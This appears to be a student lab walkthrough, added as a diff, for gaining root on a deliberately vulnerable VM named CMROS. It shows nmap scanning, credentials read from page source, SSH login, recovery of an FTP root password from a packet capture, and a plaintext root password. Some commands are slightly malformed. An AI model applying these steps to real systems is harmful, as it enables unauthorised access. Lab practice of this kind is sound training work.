@@ -1,0 +1,42 @@
+week 7 Analyze and exploit the root system of CMROS
+Step1: Download CMROS.zip and extract the zip file. 
+Step2: Open VMWare.
+Step3: Open Virtual Machine and click CMROS extracted folder Select the file
+Step4: Power on the cmros virtual machine and consider IP address of cmros
+Step5: Open Kali linux on and open terminal
+Step6: Start attacking by following commands.
+Step7: Open nmap tool and give the IP address of the CMROS. It shows only http service only in the nmap tool.
+Step8: In kali enter command > nmap -p -65535 -T4 -A -V 192.168.232.128
+Step9: Now open Kali Linux browser and search 192.168.232.128/
+Step10: Right Click --> view page source
+Step11: It displays the source code
+Step12: After scrolling down the source code page there we can find username and password.
+Goto kali linux terminal and use the below command
+Use the password we got from the view page source code which is test
+Step13: >ssh test@192.168.232.128 -p 13652
+~$ ls
+~$ whoami test
+~$ cd Desktop
+~/Desktop$ ls 
+Step13: Goto Desktop
+Step14: Open kali linux and search for wireshark tool. Open wireshark tool in kali. 
+Open cap.pcapng file in the wireshark from desktop folder. 
+Step15: Click any tcp filter and then right click →click follow → TCP Stream. It displays user credentials
+Step16: By using the above credentials we can crack cmros system
+Step17: 
+Now use ls command root@VulnOs:~# ls 
+Desktop	tazinst.conf
+root@VulnOs:~# cd Desktop 
+root@VulnOs:~/Desktop# ls
+
+output:
+220 pyftpdlib 1.5.6 ready.
+USER root
+331 Username ok, send password
+PASS 5gr3ss9hvvc68mT66
+230 Login successful
+VulnOs login: root
+Password:
+Welcome to the Open Source World!
+SliTaz GNU/Linux is distributed in the hope that it will be useful, but with ABSOLUTELY NO WARRANTY.
+root @VulnOs: *# -
